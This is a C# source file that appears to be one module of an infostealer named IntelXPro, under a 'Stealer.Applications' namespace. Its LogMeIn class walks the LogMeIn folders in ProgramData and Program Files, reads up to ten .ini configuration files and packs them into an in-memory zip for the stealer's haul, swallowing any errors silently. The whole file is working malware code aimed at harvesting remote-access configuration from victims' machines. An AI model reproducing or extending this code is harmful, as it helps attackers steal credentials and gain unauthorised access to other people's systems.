using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class LogMeIn : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string programDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "LogMeIn");
            string programFilesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "LogMeIn");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "LogMeIn";

            bool foundData = false;

            if (Directory.Exists(programDataPath))
            {
                foundData |= CollectFromDirectory(programDataPath, "ProgramData", zip, counterApplications);
            }

            if (Directory.Exists(programFilesPath))
            {
                foundData |= CollectFromDirectory(programFilesPath, "ProgramFiles", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] iniFiles = Directory.GetFiles(basePath, "*.ini", SearchOption.AllDirectories);
                
                foreach (string file in iniFiles.Take(10))
                {
                    string relativePath = file.Substring(basePath.Length + 1);
                    string zipPath = $"Applications\\LogMeIn\\{location}\\{relativePath.Replace("\\", "/")}";
                    zip.AddFile(zipPath, File.ReadAllBytes(file));
                    counterApplications.Files.Add(file + " => " + zipPath);
                    foundData = true;
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
